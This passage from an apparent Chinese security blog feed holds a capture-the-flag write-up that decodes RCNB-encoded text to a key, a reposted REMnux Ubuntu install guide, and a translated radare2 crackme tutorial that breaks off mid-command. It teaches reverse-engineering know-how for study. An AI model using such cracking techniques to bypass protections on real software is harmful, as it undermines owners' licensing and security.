ĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc'</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">f = open(<span class="string">'plain_array.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">t = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = t.split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> len(data)</span><br><span class="line"><span class="comment"># print data</span></span><br><span class="line">f = open(<span class="string">'trial.7z'</span>, <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    f.write(chr(int(data[i])))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>解压后拿到一个新文件<code>nb</code>，还是被加密了的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ȐȼŃƁȓĉnƅŕƇŅƀȓƇŃƅȒċƝþŕƇNƄɌćŃÞɌCȵBȒČNƄɌCňƀɌćÑbȒCŅÞŕƇŇƁȓƇńƁŕƇŅƅȒCņbȒċƝÞȒƈƝƀȒČnƁɌćŃÞȓƈȠƅȓƇNþɌcńBȓĊǸƁȒȼȵbȒƈnbɌCȵßȒȼȠÞȓĉNƁŗćƝƅRćŇbƞƅRȻÑßŘȻŇƁrĊńßŕčȠþRĉNƁƦĈņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƅŔĆņÞrȼȒćƝþǸßRĊńþrȻNþrČńßŕčǸÞRĊȵÞrȼȵbŕƇŇÞrĊnÞŔĆnBŘÇƝƃrĉǹþƦćņƅƦcȵƀƦćņBƦcǹÞƦćŃbƦĈNƁƦĈȒćƝÞnƃŔĆǸþRĊƝƃrĉňÞƦĉřƇƞþȵƅrȼņbrCnƃŔĆņßRćńßrȻńßŕčŃBRĊƞƅřȻƞƀřƇǹþƦćȵÞřƈƞþřȻŅþƦcǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻņƁƦcǹþƦćņƄƦcƞƄřȻņBƦcǹÞƦćŃbƦĈȵƀƦćȒćƝÞŃƄŔCƞÞřȻŅþƦcňÞƦĉřƇƞþȵƅrȼņbrCŃƄŔCƞßřȻŅÞƦcǹÞƦćȵƄřƈȵƀƦćŅÞƦcňÞƦĉȵƁřƈŅßřƇȒćƝþŃBRĊƞßřȻņƀƦcňÞƦĉȵƄřƈƞÞřȻņƀƦcǹÞƦćNþƦĈƞƅřȻņƀƦcňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞƄřȻȒćƝÞnƃŔĆǸþRĊŇƅrĊŃBrČŃƃŔċńþrȻŅbrċǹÞƦćȵÞřƈȓčnÞnƅrćǸƃŔćÑþŘȻȠBŘĊȵƅŕċRćņßƝƃŔƇȵƅrƇŅÞƦcǹÞƦćȵƁřƈȓčnƄNþřĆŃƃŔċÑƀrÇƞƀřƇǹþƦćņƄƦcƞƅřȻņƁƦcňÞƦĉņƄƦcňßƦcņƀƦcǸßřȻȵƃřƈňßƦcŇBřƇǸƄřȻņƄƦcȵƀƦćȒćƝÞǸbŔćňÞRČNƅŘCǹÞƦćŃbƦĈňÞƦcƞƀřƇǸƄřȻȒĉŅBǹÞrčȠbrčŅÞŔcÑƃRCȵbŕƇnƅrćŃƄŔCƞßřȻŅÞƦcňÞƦĉȵƁřƈƞƄřȻŇbřƇňÞƦĉȵƁřƈŅßřƇŇBřƇǸƁřȻņƄƦcƞßřȻƞƀřƇǹþƦćȵÞřƈÑbřȻřČȵßǸÞRĊǸþRĊǹÞrčȠbrčǸbŔćņþRćȠƃŘĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƁřȻņƄƦcƞƅřȻƞƀřƇǹÞƦćȵƀřƈNƁƦĈƞƀřƇňÞƦĉȵƄřƈƞþřȻŇbřƇǸƁřȻņƄƦcƞƄřȻņBƦcǸßřȻȵþřƈȵƀƦćȒćƝƄȵƅŔȻNƅRĉǸƅŘCņbrCȠBŔĆŅßřƇřČȵƁȵƅŔȻńþrȻƝƃrĉǸƃřȻȵÞřƈNƁƦĈņBƦcňÞƦĉȵƁřƈŇbƦĆŅÞƦcǹþƦćņƅƦcȵƀƦćŇBřƇǸƅřȻȵþřƈƞßřȻņƀƦcǸƄřȻȵƄřƈȵƀƦćņƀƦcǹÞƦćŃbƦĈNƁƦĈņƁƦcǹÞƦćNþƦĈƞßřȻřČȵƅnƃŔĆƝƃrƈǹƀŕĉŇÞrĊnƃŔĆȵƁrȼņbŔcŃƃrČǸbŔćņßRćÑƀrƇǸßřȻņƄƦcƦȼŇƅnßrćǹbRĊŅbrȻǹÞŕĊňÞƦĉřƇÑbǸþŕĉńƅŕčƞƀRȻÑBRCƝBrƈŃbřĆŃÞŖĊnƀŘÇǹƀŕĉŇƄrĊƝƃŔƇȵƄrȼŃƀrČņBrCȠþRĉňßƦcřċÑƅRĆŇþŖƇŃÞǹƅƦćȒĉŅBȵƁrȼňßŕċȠßŔčƞßřȻņƁƦcǹÞƦćřƇƞþǹÞrčņbrCnƃŔĆÑƃRCȵbŕƇņbrCnÞŔĆnBŘÇŇƅrĊŃƄrČŃBRĊƞƅřȻņƀƦcǸƃřȻȵßřƈƞßřȻƞƀřƇǸƁřȻņƄƦcƞÞřȻŇbřƇǹÞƦćNþƦĈƞƄřȻņƀƦcǸƁřȻņƄƦcƞßřȻƞƀřƇǹÞƦćȵÞřƈƞƄřȻŇBřƇǸƅřȻȵþřƈƞƅřȻȒćƝƅŃÞŖĊnBŘÇŅbrȻȠBrčǸÞRĊǸßRĊŅßŔcŃƁřĆǹbRĊȵßrȼƞbŘČŇþrĊǸÞRĊÑBRCǹƄrčńƅŕčŃƄŔCƞßřȻņƁƦcǹÞƦćȵÞřƈȓČŃƅƝƅƦcNþƦĈňßƦcņBƦcǹßƦćńßřƇňßƦcņƀƦcǸƅřȻřčȠbŅþƦcǹƅƦćȵƄřƈƞÞřȻƞƀřƇ</span><br></pre></td></tr></table></figure><p>然后一层层解密拿到key：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Well done! It seems that you have great programming skills.</span><br><span class="line"></span><br><span class="line">ȐȼŃßɌCȵƃȒȼȵbȒƈnbɌÇńßɌĈȠƃȒȻŃBȓƈȠƃȒȼȵbȒČŃBɌCňƀȒĊŇßɌcńþȓČŇƁŕƇņÞȒȻŃƄŕƇŅƅȓƇŃƃȒȼȠbȒCņƁɌCňƀȒCŅƀȒĉȠƀɌćÑbɌcŅƄɌĉņƄȒȻńƄɌĉŇÞŕƇņÞȒȻŃƄŕƇŃbȒČŃƄŕƇńBȒČnƁȓȼǸß</span><br><span class="line"></span><br><span class="line">ŗĆnƀȒćnþŕƇnþȓƇńƅɌƇƝƄřĈƝßŗƇȠbȓčȵbȒȼƞþŗcŅƅȑĉȠƁȒCŅƀɌćŃÞɌćÑßŕƇŅþȓČňBɌČŅƅȓĊǸƄɌcńƄŕƇńþȒĆȵþɌĉŇÞŕƇŃƃřčȠbřċȵƀȓCÑBřćŃBŖČȵƃɌćǸƀȓƈȠßŘčŅƄŗĉȠƄȒȼȵƅȒȻŅBȒĆƝƃȒĈÑƄȓĊņBřƇNƁɌƇƞbɌCƝßȐĉņþƦȻƝƃŗĈńƀɌCƝB</span><br><span class="line"></span><br><span class="line">;) ȐcňÞŗcŅƅȒCŅƀȒĉȠƀȒȻŃƄɌcńƄŖċŅþŕƇņÞȒȻŃƄŕƇŅþȒČŃßŘčńbƦȻŇƅɌČÑþɌƈǹƃɌĉŅßȒCŅƅȒČnBƦȻƝƃȑÇƝƄŘCNƁȐĉņþ</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Well done! It seems that you have great programming skills.</span><br><span class="line"></span><br><span class="line">Wishing you happiness during the holidays and throughout the New Year!</span><br><span class="line"></span><br><span class="line">- by Coxxs@52PoJiE, [Want to know more about RCNB.js?](https://github.com/Coxxs/RCNB.js)</span><br><span class="line"></span><br><span class="line">;) Oh, and here&apos;s the key: N0w_y0u_are_NB_A5_RC</span><br></pre></td></tr></table></figure><h1 id="感谢的话"><a href="#感谢的话" class="headerlink" title="感谢的话"></a>感谢的话</h1><p>最后感谢吾爱破解大佬们的辛勤付出！</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://github.com/Coxxs/RCNB.js" target="_blank" rel="noopener">https://github.com/Coxxs/RCNB.js</a><br><a href="https://travis-ci.com/Coxxs/RCNB.js" target="_blank" rel="noopener">https://travis-ci.com/Coxxs/RCNB.js</a><br><a href="https://liudanking.com/golang/utf-8_replacement_character/" target="_blank" rel="noopener">https://liudanking.com/golang/utf-8_replacement_character/</a><br><a href="https://www.52pojie.cn/thread-873265-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-873265-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了点简单的题目。&lt;/p&gt;
    
    </summary>
    
    
      <category term="wp" scheme="https://qianfei11.github.io/tags/wp/"/>
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>【转】Installing Minimal Ubuntu for REMnux</title>
    <link href="https://qianfei11.github.io/2019/02/20/%E3%80%90%E8%BD%AC%E3%80%91Installing-Minimal-Ubuntu-for-REMnux/"/>
    <id>https://qianfei11.github.io/2019/02/20/【转】Installing-Minimal-Ubuntu-for-REMnux/</id>
    <published>2019-02-20T14:10:38.000Z</published>
    <updated>2019-02-28T05:33:23.018Z</updated>
    
    <content type="html"><![CDATA[<p>因为google drive上下载REMnux的ova实在是太慢了，在<a href="https://remnux.org/docs/distro/get/#install-remnux-on-an-existing-system" target="_blank" rel="noopener">官方文档</a>上看到了可以用ubuntu来弄。这里记录一下安装<code>Ubuntu 14.04 64-bit minimal ISO</code>的过程。搬运自<a href="https://plus.google.com/photos/+REMnuxOrg/albums/6156978999037787521?authkey=CP2Zs4P-tZWcmQE" target="_blank" rel="noopener">这里</a>。</p><a id="more"></a><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/1.png" alt="If you&#39;re preparing to install REMnux using its installation script, use Ubuntu 14.04 64-bit minimal ISO as the starting point."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/2.png" alt="Select your preferred language for the installation. This example uses English."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/3.png" alt="Select the location for your desired time zone and locale. This example uses United States."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/4.png" alt="Auto-detecting the keyboard sometimes doesn&#39;t work well. We recommend manually specifying the desired keyboard layout."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/5.png" alt="Select the country of origin for your keyboard. This example uses English (US)."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/6.png" alt="Select your keyboard layout. This example uses English (US)."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/7.png" alt="You can pick any hostname you wish. We suggest using &quot;remnux&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/8.png" alt="Select the your country. This example uses United States."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/9.png" alt="Select the desired Ubuntu server. Accepting the default usually works well."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/10.png" alt="If accessing the Internet at your location requires going through a proxy server, specify that server now. Otherwise, simply click Continue."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/11.png" alt="Assign a full name for the primary user account you&#39;ll use on REMnux. We suggest specifying the name REMnux User."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/12.png" alt="Select the username for the account you&#39;ll be using on REMnux. We recommend picking the name &quot;remnux&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/13.png" alt="Select the desired password. The default REMnux installation uses the word &quot;malware&quot; as the password."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/14.png" alt></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/15.png" alt="The expected use of REMnux in a controlled analysis lab typically accommodates weak passwords, such as &quot;malware&quot;. However, if you&#39;re concerned about password complexity, select a stronger password."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/16.png" alt="The typical use of REMnux typically doesn&#39;t benefit from having the user&#39;s home directory encrypted. We suggest selecting No when asked whether to encrypt it."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/17.png" alt="Confirm your time zone. This example uses America/New_York."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/18.png" alt="Select &quot;Guided - use entire disk&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/19.png" alt="Select the desired partition. If you&#39;re installing Ubuntu on a system other than VMware, the name of your partition might be different from the one shown in your example. Your disk size might differ, too."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/20.png" alt="Select Yes when asked whether to write the changes to disks."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/21.png" alt="The typical use of REMnux typically doesn&#39;t benefit from automatic updated. Instead, REMnux users are encouraged to update their system by using the update-remnux command. Therefore, we recommend selecting &quot;No automatic updates&quot;."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/22.png" alt="Select &quot;Basic Ubuntu server.&quot; This helps keep the system lightweight. The REMnux installer will add the necessary packages later."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/23.png" alt="Select Yes when asked whether to install the boot loader to the master boot record."></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/24.png" alt></p><p><img src="/pics/Installing-Minimal-Ubuntu-for-REMnux/25.png" alt="Press Continue to reboot the system. After it starts up again, log in using the username and password you&#39;ve established during the Ubuntu installation process, then follow REMnux installation instructions at https://remnux.org/docs/distro/get."></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为google drive上下载REMnux的ova实在是太慢了，在&lt;a href=&quot;https://remnux.org/docs/distro/get/#install-remnux-on-an-existing-system&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官方文档&lt;/a&gt;上看到了可以用ubuntu来弄。这里记录一下安装&lt;code&gt;Ubuntu 14.04 64-bit minimal ISO&lt;/code&gt;的过程。搬运自&lt;a href=&quot;https://plus.google.com/photos/+REMnuxOrg/albums/6156978999037787521?authkey=CP2Zs4P-tZWcmQE&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这里&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="repost" scheme="https://qianfei11.github.io/tags/repost/"/>
    
  </entry>
  
  <entry>
    <title>【译】Radare2之旅-Part1：Simple crackme</title>
    <link href="https://qianfei11.github.io/2019/02/18/%E3%80%90%E8%AF%91%E3%80%91Radare2%E4%B9%8B%E6%97%85-Part1%EF%BC%9ASimple%20crackme/"/>
    <id>https://qianfei11.github.io/2019/02/18/【译】Radare2之旅-Part1：Simple crackme/</id>
    <published>2019-02-18T04:17:27.000Z</published>
    <updated>2019-02-28T05:32:04.386Z</updated>
    
    <content type="html"><![CDATA[<p>翻译自<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">Megabeets</a>。</p><a id="more"></a><h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>过去一年里的CTF比赛中，不论是逆向工程（RE）还是漏洞挖掘（PWN），我一直在用<code>radare2</code>。我发现<code>radare2</code>对于很多CTF的题目来说都很有用，极大地缩短了我的做题时间。遗憾的是熟悉radare2的人太少了。可能大家都习惯了使用<code>IDA Pro</code>、<code>OllyDBG</code>还有<code>gdb</code>，或者没有听说过它。不管怎么样，我都认为<code>radare2</code>应该成为你工具箱中的一部分。</p><p>因为我真的特别喜欢这个项目，而且我希望能有越来越多的人开始熟悉它、使用它，能对项目做出一些贡献。我计划写一系列的文章以及使用<code>r2</code>的例子。因为那些文章都涉及<code>radare2</code>的特点和功能，我会解释的更加详细。</p><p><img src="https://www.megabeets.net/uploads/r2_part1_1.png" alt="Welcome to IDA 10.0. （在 radare2/doc/fortunes.fun 查看更多）"></p><h1 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a><code>radare2</code></h1><p><code>radare2</code>是一个逆向工程和二进制分析的开源框架，它有很多命令行接口，包括反汇编、分析数据、打补丁、比较数据、查找、替换、可视化等等功能。同时它可以在几乎所有的主要操作系统（<code>GNU/Linux</code>、<code>.Windows</code>、<code>*BSD</code>、<code>iOS</code>、<code>OSX</code>、<code>Solaris</code>等等）上运行，并且支持许多CPU架构和文件格式。他所有的特点可以展现出一个思想——<code>radare2</code>是绝对自由的。</p><p>该框架是一个工具的集合，既可以在<code>r2</code>给出的shell下使用，又可以独立使用——比如我们将要了解的<code>rahash2</code>、<code>rabin2</code>、<code>ragg2</code>三个组件。所有的组件赋予了<code>radare2</code>强大的静态或动态分析、十六进制编辑以及漏洞挖掘能力（在接下来的文章中我会更深入地讲述）。</p><p>我们必须意识到学习<code>r2</code>是一个十分艰难的过程——虽然<code>r2</code>有GUI和WebUI。在我看来，IDA的GUI和方便性确实更佳。但是它的命令行接口，包括其可视化模式，仍然是<code>radare2</code>的核心以及魅力所在。因为它的复杂性，我会尽力讲得浅显易懂。</p><p><img src="https://www.megabeets.net/uploads/r2_learning_curve.png" alt="这差不多是r2的学习曲线"></p><p>在开始之前，你可以看一看<a href="https://www.radare.org/r/cmp.html" target="_blank" rel="noopener">“r2、IDA Pro和Hopper等工具间的比较”</a>来了解它。</p><h1 id="获取radare2"><a href="#获取radare2" class="headerlink" title="获取radare2"></a>获取<code>radare2</code></h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><code>radare2</code>的环境配置非常快——我们每天都会更新，所以更推荐你去使用git的版本，而不是稳定版本。有时候稳定版本可能没有git版本更稳定。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> git clone https://github.com/radare/radare2.git</span><br><span class="line"><span class="meta">$</span> cd radare2</span><br><span class="line"><span class="meta">$</span> ./sys/install.sh</span><br></pre></td></tr></table></figure><p>如果你不想下载git版本或者你想要不同操作系统（<code>Windows</code>、<code>OS X</code>、<code>iOS</code>等等）上的可执行文件，可以在<a href="https://www.radare.org/r/down.html" target="_blank" rel="noopener">radare2官网下载界面</a>查看。</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>正如我之前所说的，更推荐大家使用git仓库里最新版的<code>r2</code>。从git更新<code>r2</code>只需要执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./sys/install.sh</span><br></pre></td></tr></table></figure><p>然后你就能从git获得最新的版本。我通常每天早上会更新一下<code>radare2</code>，在这期间可以看看一会儿视频消遣。</p><h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><p>我实在想不出什么理由会让你在看这篇文章时想要卸载<code>radare2</code>。如果要卸载的话只需要执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> make uninstall</span><br><span class="line"><span class="meta">$</span> make purge</span><br></pre></td></tr></table></figure><h1 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a>开始学习</h1><p>你可以在<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%201%20-%20Simple%20crackme/megabeets_0x1" target="_blank" rel="noopener">这里</a>下载Crackme。</p><p>现在你已经在自己的系统上下载了<code>radare2</code>和文件，我们可以开始探索<code>radare2</code>的基础使用。我会在<a href="https://remnux.org/" target="_blank" rel="noopener">REMunx</a>上调试，大部分的命令和说明跟<code>Windows</code>或者其他系统上是一样的。</p><h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>和大部分命令行工具一样，查看可选参数的方式是执行<code>-h</code>参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 -h</span><br></pre></td></tr></table></figure><p>我不把完整的输出放上来，而是放一些我日常工作中常用的参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Usage: r2 [-ACdfLMnNqStuvwz] [-P patch] [-p prj] [-a arch] [-b bits] [-i file]</span><br><span class="line">          [-s addr] [-B baddr] [-M maddr] [-c cmd] [-e k=v] file|pid|-|--|=</span><br><span class="line">  </span><br><span class="line">-d: Debug the executable 'file' or running process 'pid'</span><br><span class="line">-A: Analyze executable at load time (xrefs, etc)</span><br><span class="line">-q: Quiet mode, exit after processing commands</span><br><span class="line">-w: Write mode enabled</span><br><span class="line">-L: List of supported IO plugins</span><br><span class="line">-i [file]: Interprets a r2 script</span><br><span class="line">-n: Bare load. Do not load executable info as the entrypoint</span><br><span class="line">-c 'command; command; ...': Run r2 and execute commands (eg: r2 's main; px 60')</span><br><span class="line">-p [prj]: Creates a project for the file being analyzed</span><br><span class="line">-: Opens r2 with the malloc plugin that gives a 512 bytes memory area to play with</span><br></pre></td></tr></table></figure><h2 id="二进制信息"><a href="#二进制信息" class="headerlink" title="二进制信息"></a>二进制信息</h2><p>面对一个新的文件时，我第一件想做的事就是获取文件的信息。我们可以使用<code>r2</code>框架中最强大的工具之一——<code>rabin2</code>来获取信息。</p><blockquote><ul><li><p><code>rabin2</code>可以从二进制文件中获取信息，包括区段、文件头、导入导出表、字符串、入口点等等。同时具有不同的格式的输出。<code>rabin2</code>支持<code>ELF</code>、<code>PE</code>、<code>Mach-O</code>、<code>Java CLASS</code>等文件。</p></li><li><p>使用<code>man rabin2</code>查看更多的信息。</p></li></ul></blockquote><p>我们执行<code>rabin2</code>并使用参数<code>-I</code>输出二进制信息，例如操作系统、语言、字节序、框架以及保护技术（比如<code>Canary</code>、<code>PIC</code>、<code>NX</code>）等等。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> rabin2 -I megabeets_0x1</span><br><span class="line">havecode true</span><br><span class="line">pic      false</span><br><span class="line">canary   false</span><br><span class="line">nx       false</span><br><span class="line">crypto   false</span><br><span class="line">va       true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">bintype  elf</span><br><span class="line">class    ELF32</span><br><span class="line">lang     c</span><br><span class="line">arch     x86</span><br><span class="line">bits     32</span><br><span class="line">machine  Intel 80386</span><br><span class="line">os       linux</span><br><span class="line">minopsz  1</span><br><span class="line">maxopsz  16</span><br><span class="line">pcalign  0</span><br><span class="line">subsys   linux</span><br><span class="line">endian   little</span><br><span class="line">stripped false</span><br><span class="line">static   false</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">relocs   true</span><br><span class="line">rpath    NONE</span><br><span class="line">binsz    6220</span><br></pre></td></tr></table></figure><p>你可以清楚地看到，这是一个32位elf文件，没有符号表并且是动态链接。它没有任何漏洞利用技术——下一篇文章我们讲学习使用<code>radare2</code>来对漏洞进行利用。<br>让我们跑一下程序，看看它做了什么。</p><blockquote><ul><li>注意：虽然我可以向你保证这个程序是安全的，但是逆向一个未知的程序时，务必在一个虚拟环境下运行。</li><li>不过你可以相信我，因为程序确实是安全的。😛</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./megabeets_0x1</span><br><span class="line"> </span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line">Think you can make it?</span><br><span class="line">Nop, Wrong argument.</span><br><span class="line"> </span><br><span class="line"><span class="meta">$</span> ./megabeets_0x1 abcdef</span><br><span class="line"> </span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line">Think you can make it?</span><br><span class="line">Nop, Wrong argument.</span><br></pre></td></tr></table></figure><p>第一次跑的时候，输出了<code>Nop, Wrong argument</code>。假设我们需要提供一个参数，第二次输入<code>abcdef</code>作为参数，依旧失败了。显然需要特定的字符串才能绕过。</p><p>让我们用<code>radare2</code>来测试程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> r2 ./megabeets_0x1</span><br><span class="line"> — Thank you for using radare2. Have a nice night!</span><br><span class="line"><span class="meta">[0x08048370]&gt;</span></span><br></pre></td></tr></table></figure><p>我们生成了一个<code>radare2</code>的shell，还有一个欢迎界面。我们可以执行<code>fo</code>来输出一个新的句子，有些很搞笑同时有些也很有趣。现在<code>r2</code>的shell正在等着我们输入命令，并且展示给我们此刻所在的地址（0x08048370）。默认情况下我们自动在入口点处。让我们看看是否正确：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x08048370]&gt;</span> ie</span><br><span class="line">[Entrypoints]</span><br><span class="line">vaddr=0x08048370 paddr=0x00000370 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints</span><br></pre></td></tr></table></figure><p>我们使用<code>ie</code>命令输出了文件的入口点地址。<code>r2</code>命令有一系列有意义的字母。在这个例子里，<code>ie</code>代表了<code>info &gt;&gt; 